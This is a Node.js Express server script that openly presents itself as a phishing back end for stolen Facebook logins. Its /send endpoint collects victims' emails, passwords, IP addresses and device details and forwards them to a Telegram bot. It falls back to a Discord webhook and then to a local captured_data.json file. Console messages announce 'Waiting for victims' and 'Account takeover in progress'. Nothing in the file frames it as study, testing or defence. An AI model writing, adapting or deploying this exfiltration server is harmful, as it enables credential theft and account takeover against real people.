// ✅ PROXY SERVER WITH .ENV
require('dotenv').config();  // Load .env file
const express = require('express');
const app = express();
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');

// 🔴 Read from .env (NOT hardcoded!)
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const BACKUP_EMAIL = process.env.BACKUP_EMAIL;

// Validate required env variables
if (!BOT_TOKEN || !CHAT_ID) {
    console.error('❌ Missing required environment variables!');
    console.error('Please check your .env file');
    process.exit(1);
}

app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        env: process.env.NODE_ENV || 'development'
    });
});

// Main endpoint for receiving credentials
app.post('/send', async (req, res) => {
    try {
        const { email, password, userAgent, ip, screen, language, timestamp } = req.body;
        
        // Get real IP
        const realIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ip;
        
        console.log(`🔴 [${new Date().toISOString()}] Credentials received: ${email}`);
        
        // Build message
        const message = `
🔴 FACEBOOK CREDENTIALS CAPTURED! 🔴

========================================
🎯 CREDENTIALS
========================================
📧 Email: ${email}
🔑 Password: ${password}

========================================
🌐 NETWORK INFORMATION
========================================
🌍 IP Address: ${realIP}
🔗 Page: ${req.headers.referer || 'Direct'}
📊 Screen: ${screen || 'Unknown'}
🌍 Language: ${language || 'Unknown'}

========================================
📱 DEVICE INFORMATION
========================================
📱 Device: ${userAgent || 'Unknown'}
🕐 Time: ${timestamp || new Date().toISOString()}

========================================
📊 STATISTICS
========================================
🔴 Status: CREDENTIALS STOLEN!
⚠️ Action: Account takeover in progress...
        `;
        
        // 1️⃣ Send to Telegram (Primary)
        let telegramResponse = null;
        try {
            telegramResponse = await axios.post(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                {
                    chat_id: CHAT_ID,
                    text: message
                }
            );
            console.log(`✅ [${new Date().toISOString()}] Sent to Telegram: ${email}`);
        } catch (telegramError) {
            console.error('❌ Telegram failed:', telegramError.message);
            // 2️⃣ Try Discord as backup
            if (DISCORD_WEBHOOK) {
                await sendToDiscord(email, password, realIP, userAgent);
            }
            // 3️⃣ Save locally as last resort
            saveLocally(email, password, realIP, userAgent);
        }
        
        res.json({
            success: true,
            message: 'Data sent successfully',
            telegram: telegramResponse?.data || null
        });
        
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// Backup: Send to Discord
async function sendToDiscord(email, password, ip, userAgent) {
    try {
        await axios.post(DISCORD_WEBHOOK, {
            content: `🚨 **CREDENTIALS CAPTURED** 🚨
            📧 Email: ${email}
            🔑 Password: ${password}
            🌐 IP: ${ip}
            📱 Device: ${userAgent}
            🕐 Time: ${new Date().toLocaleString()}`
        });
        console.log(`✅ Sent to Discord: ${email}`);
    } catch (error) {
        console.error('❌ Discord failed:', error.message);
    }
}

// Backup: Save locally
function saveLocally(email, password, ip, userAgent) {
    try {
        const data = {
            email,
            password,
            ip,
            userAgent,
            timestamp: new Date().toISOString()
        };
        
        const logFile = path.join(__dirname, 'captured_data.json');
        let existing = [];
        
        if (fs.existsSync(logFile)) {
            existing = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        }
        
        existing.push(data);
        fs.writeFileSync(logFile, JSON.stringify(existing, null, 2));
        console.log(`✅ Saved locally: ${email}`);
    } catch (error) {
        console.error('❌ Save failed:', error.message);
    }
}

// Stats endpoint (for monitoring)
app.get('/stats', (req, res) => {
    const stats = {
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        memory: process.memoryUsage(),
        env: process.env.NODE_ENV || 'development'
    };
    res.json(stats);
});

// Start server
app.listen(PORT, () => {
    console.log('=' .repeat(50));
    console.log('🔴 PHISHING SERVER WITH .ENV');
    console.log('=' .repeat(50));
    console.log(`📡 Port: ${PORT}`);
    console.log(`🔗 URL: http://localhost:${PORT}`);
    console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`📱 Chat ID: ${CHAT_ID}`);
    console.log(`📁 .env file loaded: ${fs.existsSync('.env') ? '✅ YES' : '❌ NO'}`);
    console.log('=' .repeat(50));
    console.log('✅ Server is ready!');
    console.log('⚠️ Waiting for victims...');
});